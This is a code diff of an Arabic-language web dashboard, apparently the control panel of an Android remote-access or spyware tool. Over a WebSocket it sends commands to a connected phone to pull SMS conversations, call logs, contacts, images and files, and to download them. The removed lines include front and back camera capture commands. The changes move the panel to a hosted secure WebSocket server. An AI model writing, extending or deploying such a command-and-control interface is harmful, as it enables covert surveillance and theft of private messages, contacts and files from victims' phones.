@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>Dashboard Pro - Black Edition</title>
+    <title>Dashboard Pro - Render Edition</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         body { background-color: #000; margin: 0; padding: 0; font-family: sans-serif; color: #fff; }
@@ -13,10 +13,9 @@
         .icon-box { font-size: 28px; margin-bottom: 8px; display: inline-block; padding: 10px; border-radius: 12px; }
         .menu-item span { font-size: 11px; display: block; }
         
-        #content-view { padding: 10px; }
+        #content-view { padding: 10px; display: none; }
         .grid-layout { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; }
         
-        /* تنسيق الجداول */
         .table-container { overflow-x: auto; background: #1c1c1e; border-radius: 12px; border: 1px solid #333; margin-top: 10px; }
         table { width: 100%; border-collapse: collapse; font-size: 13px; }
         th, td { padding: 12px; text-align: right; border-bottom: 1px solid #333; }
@@ -25,10 +24,9 @@
         .data-card { background: #1c1c1e; border: 1px solid #333; border-radius: 10px; padding: 5px; text-align: center; cursor: pointer; }
         .data-card img { width: 100%; height: 100px; object-fit: cover; border-radius: 8px; }
 
-        /* تنسيق فقاعات الدردشة */
         .chat-container { display: flex; flex-direction: column; gap: 10px; padding: 10px; background: #000; }
-        .msg-bubble { max-width: 85%; padding: 12px 16px; border-radius: 18px; font-size: 14px; line-height: 1.4; position: relative; }
-        .received { background: #262629; color: #fff; align-self: flex-end; border-bottom-left-radius: 4px; text-align: right; }
+        .msg-bubble { max-width: 85%; padding: 12px 16px; border-radius: 18px; font-size: 14px; line-height: 1.4; }
+        .received { background: #262629; color: #fff; align-self: flex-end; border-bottom-left-radius: 4px; }
         .sent { background: #0a84ff; color: #fff; align-self: flex-start; border-bottom-right-radius: 4px; }
         .msg-time { display: block; font-size: 10px; color: #8e8e93; margin-top: 5px; }
 
@@ -36,49 +34,50 @@
         .btn-circle { width: 55px; height: 55px; border-radius: 50%; border: none; color: white; font-size: 22px; cursor: pointer; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 15px rgba(0,0,0,0.6); }
         
         #loading { position: fixed; top: 15px; left: 15px; background: #34c759; color: #000; padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: bold; display: none; z-index: 3000; }
-        #overlay { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:2000; flex-direction:column; align-items:center; justify-content:center; }
-        h3 { border-right: 4px solid #0a84ff; padding-right: 10px; margin: 15px 0; font-size: 18px; }
+        #status { font-size: 13px; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div id="loading">انتظر...</div>
+<div id="loading">جاري جلب البيانات...</div>
 
 <div class="header">
-    <div id="status" style="font-size: 13px; color: #ff3b30;">🔴 الهاتف غير متصل</div>
+    <div id="status" style="color: #ff3b30;">🔴 جاري محاولة الاتصال بالسيرفر...</div>
 </div>
 
 <div id="menu-screen" class="main-menu">
-    <div class="menu-item" onclick="sendCmd('get_all_videos')"><div class="icon-box" style="background: #ff3b30;">🎬</div><span>فيديوهات</span></div>
-    <div class="menu-item" onclick="sendCmd('get_all_images')"><div class="icon-box" style="background: #af52de;">🖼️</div><span>صور</span></div>
-    <div class="menu-item" onclick="sendCmd('list_files', '')"><div class="icon-box" style="background: #ffcc00;">📂</div><span>الملفات</span></div>
+    <div class="menu-item" onclick="sendCmd('get_all_images')"><div class="icon-box" style="background: #af52de;">🖼️</div><span>الصور</span></div>
+    <div class="menu-item" onclick="sendCmd('sms_threads')"><div class="icon-box" style="background: #34c759;">💬</div><span>الرسائل</span></div>
     <div class="menu-item" onclick="sendCmd('call_logs_full')"><div class="icon-box" style="background: #5856d6;">📞</div><span>السجل</span></div>
     <div class="menu-item" onclick="sendCmd('contacts')"><div class="icon-box" style="background: #ff9500;">👤</div><span>الأسماء</span></div>
-    <div class="menu-item" onclick="sendCmd('sms_threads')"><div class="icon-box" style="background: #34c759;">💬</div><span>الرسائل</span></div>
+    <div class="menu-item" onclick="sendCmd('list_files', '')"><div class="icon-box" style="background: #ffcc00;">📂</div><span>الملفات</span></div>
+    <div class="menu-item" onclick="location.reload()"><div class="icon-box" style="background: #8e8e93;">🔄</div><span>تحديث</span></div>
 </div>
 
 <div id="content-view"></div>
 
-<div id="overlay" onclick="this.style.display='none'"><img id="preview" style="max-width:95%; border-radius:10px;"></div>
-
 <div class="side-tools">
-    <button class="btn-circle" style="background:#ff3b30;" onclick="sendCmd('camera','1')">🤳</button>
-    <button class="btn-circle" style="background:#34c759;" onclick="sendCmd('camera','0')">📷</button>
-    <button class="btn-circle" style="background:#0a84ff;" onclick="location.reload()">🏠</button>
+    <button class="btn-circle" style="background:#0a84ff;" onclick="goHome()">🏠</button>
 </div>
 
 <script>
     let ws;
+    // نستخدم wss للاتصال المشفر مع رندر
+    const serverUrl = "wss://" + window.location.hostname; 
+
     function connect() {
-        ws = new WebSocket("ws://" + location.hostname + ":8080");
+        ws = new WebSocket(serverUrl);
 
         ws.onopen = () => {
+            console.log("Connected to Server");
+            document.getElementById('status').innerText = "🟡 متصل بالسيرفر: في انتظار الهاتف...";
+            document.getElementById('status').style.color = "#ffcc00";
             ws.send(JSON.stringify({ type: 'login_admin' }));
-            setInterval(() => { if(ws.readyState === 1) ws.send(JSON.stringify({type: 'ping'})); }, 30000);
         };
 
         ws.onclose = () => {
-            document.getElementById('status').innerText = "🔴 انقطع الاتصال.. جاري إعادة المحاولة";
+            document.getElementById('status').innerText = "🔴 انقطع الاتصال.. جاري الإعادة";
+            document.getElementById('status').style.color = "#ff3b30";
             setTimeout(connect, 3000);
         };
 
@@ -89,7 +88,7 @@
             const loader = document.getElementById('loading');
 
             if(res.type === 'login') {
-                document.getElementById('status').innerText = "🟢 متصل: " + res.model;
+                document.getElementById('status').innerText = "🟢 الهاتف متصل: " + res.model;
                 document.getElementById('status').style.color = "#34c759";
             }
 
@@ -97,43 +96,31 @@
                 loader.style.display = 'none';
                 menu.style.display = 'none';
                 area.style.display = 'block';
-                
-                // --- معالجة محادثة SMS تفصيلية (الشات) ---
+
                 if(res.category === 'sms_detailed_view') {
-                    area.className = "";
                     let msgs = JSON.parse(res.data);
                     let html = `<h3>المحادثة</h3><div class="chat-container">`;
                     msgs.forEach(m => {
-                        // type 1 = استلام (رمادي) ، type 2 = إرسال (أزرق)
                         let side = (m.type === 1) ? 'received' : 'sent';
-                        html += `
-                            <div class="msg-bubble ${side}">
-                                <div>${m.body}</div>
-                                <span class="msg-time">${m.date || ''}</span>
-                            </div>`;
+                        html += `<div class="msg-bubble ${side}"><div>${m.body}</div><span class="msg-time">${m.date}</span></div>`;
                     });
-                    area.innerHTML = html + `</div><br><button onclick="location.reload()" style="width:100%; padding:15px; background:#1c1c1e; color:#0a84ff; border:1px solid #333; border-radius:10px;">العودة للقائمة</button>`;
+                    area.innerHTML = html + `</div>`;
                 }
 
-                // معالجة قائمة الرسائل (المحادثات)
                 else if(res.category === 'sms_threads') {
-                    area.innerHTML = "<h3>الرسائل الواردة</h3>";
-                    area.className = "";
+                    area.innerHTML = "<h3>المحادثات</h3>";
                     JSON.parse(res.data).forEach(t => {
                         area.innerHTML += `
-                            <div class="thread-item" style="background:#1c1c1e; padding:15px; margin-bottom:10px; border-radius:12px; border:1px solid #333; cursor:pointer;" onclick="sendCmd('sms_messages', '${t.thread_id}')">
-                                <div style="color:#0a84ff; font-weight:bold; font-size:16px;">👤 ${t.name || t.address}</div>
-                                <div style="color:#aaa; font-size:13px; margin-top:5px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">${t.snippet}</div>
+                            <div class="menu-item" style="text-align:right; margin-bottom:10px; padding:15px;" onclick="sendCmd('sms_messages', '${t.thread_id}')">
+                                <b>👤 ${t.name || t.address}</b><br>
+                                <small style="color:#aaa;">${t.snippet}</small>
                             </div>`;
                     });
                 }
 
-                // معالجة السجل والأسماء
                 else if(res.category === 'call_logs_full' || res.category === 'contacts') {
-                    area.className = "";
                     let data = JSON.parse(res.data);
-                    let title = res.category === 'contacts' ? 'جهات الاتصال' : 'سجل المكالمات';
-                    let html = `<h3>${title}</h3><div class="table-container"><table><thead><tr>`;
+                    let html = `<h3>${res.category === 'contacts' ? 'الأسماء' : 'سجل المكالمات'}</h3><div class="table-container"><table><thead><tr>`;
                     if(data.length > 0) {
                         Object.keys(data[0]).forEach(key => html += `<th>${key}</th>`);
                         html += `</tr></thead><tbody>`;
@@ -143,28 +130,22 @@
                             html += `</tr>`;
                         });
                         area.innerHTML = html + `</tbody></table></div>`;
-                    } else {
-                        area.innerHTML = `<h3>${title}</h3><p>لا توجد بيانات متاحة</p>`;
                     }
                 }
 
-                // معالجة الملفات والصور
                 else if(res.category === 'file_manager') {
-                    area.innerHTML = "<h3>استعراض الملفات</h3>";
-                    let grid = document.createElement('div');
-                    grid.className = "grid-layout";
+                    area.innerHTML = "<h3>الملفات والصور</h3><div class="grid-layout"></div>";
+                    const grid = area.querySelector('.grid-layout');
                     JSON.parse(res.data).forEach(item => {
                         const img = item.thumb ? `<img src="data:image/jpeg;base64,${item.thumb}">` : `<div style="font-size:40px; padding:20px;">${item.isDir ? '📁' : '📄'}</div>`;
-                        grid.innerHTML += `<div class="data-card" onclick="handleFile('${item.path}', ${item.isDir})">${img}<div style="font-size:10px; padding:5px;">${item.name}</div></div>`;
+                        grid.innerHTML += `<div class="data-card" onclick="handleFile('${item.path}', ${item.isDir})">${img}<div>${item.name}</div></div>`;
                     });
-                    area.appendChild(grid);
                 }
 
-                // معالجة التحميل
                 else if(res.category === 'file_download') {
                     const a = document.createElement("a");
                     a.href = `data:application/octet-stream;base64,${res.data}`;
-                    a.download = res.name || "file";
+                    a.download = res.name;
                     a.click();
                 }
             }
@@ -173,7 +154,7 @@
 
     function handleFile(path, isDir) {
         if(isDir) sendCmd('list_files', path);
-        else if(confirm("هل تريد تحميل هذا الملف؟")) sendCmd('download_file', path);
+        else if(confirm("تحميل الملف؟")) sendCmd('download_file', path);
     }
 
     function sendCmd(cmd, val="") {
@@ -183,8 +164,12 @@
         }
     }
 
+    function goHome() {
+        document.getElementById('content-view').style.display = 'none';
+        document.getElementById('menu-screen').style.display = 'grid';
+    }
+
     connect();
 </script>
 </body>
 </html>
-
